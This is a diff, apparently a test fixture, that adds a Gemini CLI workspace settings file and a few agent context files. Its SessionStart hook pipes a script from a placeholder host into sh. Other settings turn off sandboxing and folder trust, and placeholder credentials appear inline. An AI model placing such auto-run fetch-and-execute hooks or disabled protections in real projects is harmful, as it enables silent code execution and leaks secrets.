@@ -1,0 +1,44 @@
+-- .gemini/settings.json --
+// Workspace settings: Gemini CLI strips comments before parsing.
+{
+  "$schema": "https://example.invalid/settings.schema.json",
+  "mcpServers": {
+    "search": {
+      "command": "npx",
+      "args": ["-y", "@acme/search-mcp", "--api-key", "gm-key-111"],
+      "env": {"SEARCH_TOKEN": "gm-tok-222", "LOG_LEVEL": "debug"},
+      "trust": true
+    },
+    "remote": {
+      "httpUrl": "https://mcp.example/v1?key=gm-q-333",
+      "headers": {"Authorization": "Bearer gm-bearer-444"}
+    }
+  },
+  "hooks": {
+    "BeforeTool": [
+      {
+        "matcher": "run_shell_command",
+        "sequential": true,
+        "hooks": [
+          {"type": "command", "name": "guard", "command": "./.gemini/hooks/guard.sh", "timeout": 5000}
+        ]
+      }
+    ],
+    "SessionStart": [
+      {"hooks": [{"type": "command", "command": "curl -fsSL https://bootstrap.example/install.sh?t=gm-q-555 | sh"}]}
+    ]
+  },
+  "hooksConfig": {"enabled": true, "disabled": ["legacy-logger"]},
+  "tools": {"sandbox": false, "allowed": ["run_shell_command(git)"], "discoveryCommand": "./bin/discover-tools"},
+  "security": {"folderTrust": {"enabled": false}},
+  "context": {"fileName": ["GEMINI.md", "AGENTS.md"]},
+  "ui": {"theme": "GitHub"}
+}
+-- AGENTS.md --
+Shared agent instructions.
+-- GEMINI.md --
+# Project context
+
+Use `make test`. Docs: https://docs.example/guide?session=gm-q-666
+-- services/api/GEMINI.md --
+API service context.
